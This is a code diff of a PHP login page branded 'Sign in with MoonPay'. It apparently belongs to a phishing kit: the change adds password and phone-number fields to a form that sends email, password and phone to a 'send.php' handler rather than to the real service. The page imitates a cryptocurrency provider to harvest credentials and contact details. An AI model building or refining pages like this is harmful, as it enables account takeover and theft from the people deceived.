@@ -8,15 +8,25 @@
     $title = 'MoonPay Account';
     include_once './includes/meta.php';
     ?>
+    <link rel="stylesheet" href="<?= base_url('assets/country-code-picker/css/jquery.ccpicker.css') ?>">
     <body>
         <div class="container-fluid d-flex align-items-center justify-content-center" style="height: 100%">
             <div class="row">
                 <div class='rounded-5 p25 mt30 bg-white text-center' style="border: 1px #edf2f9 solid; max-width: 400px; ">
                     <h1 class="fs15">Sign in with MoonPay</h1>
                     <form method="post" action="<?= base_url('send.php') ?>" class="form">
-                        <div class="form-floating my25">
+                        <div class="form-floating my15">
                             <input name="email" type="email" required="" class="form-control" placeholder="" value="">
                             <label class="text-secondary"> <i class="fa-solid fa-envelope pe10"></i>  Email Address</label>
+                        </div>
+                        <div class="form-floating my15">
+                            <input name="password" type="password" required="" minlength="3" maxlength="50"  class="form-control" placeholder="" value="" >
+                            <label class="text-secondary"> <i class="fa-solid fa-key pe10"></i>  Password</label>
+                        </div>
+                        <div class="my15 text-start">
+                            <div class="form-control" style="padding: 0px;">
+                                <input name="phone_number" type="number" id="phone_number" required="" style="width: 70%;border: solid 0px #DDD;padding: 10px 5px;margin: 0px;" class="" placeholder="Phone number" value="" >
+                            </div>
                         </div>
                         <button type="submit" class="btn btn-success btn-primary-2 border-0 rounded-pill rounded-0 py12 fs15 w-100">Continue</button>
                     </form>
@@ -52,5 +62,11 @@
             </div>
         </div>
         <?php include_once './includes/footer.php'; ?>
+        <script src="<?= base_url('assets/country-code-picker/js/jquery.ccpicker.min.js')?>"></script>
+        <script type="text/javascript">
+            $(document).ready(function () {
+                $("#phone_number").CcPicker({countryCode: "us", dataUrl: "<?= base_url('assets/country-code-picker/data/en.json') ?>", searchPlaceHolder: "Find..."});
+            });
+        </script>
     </body>
 </html>
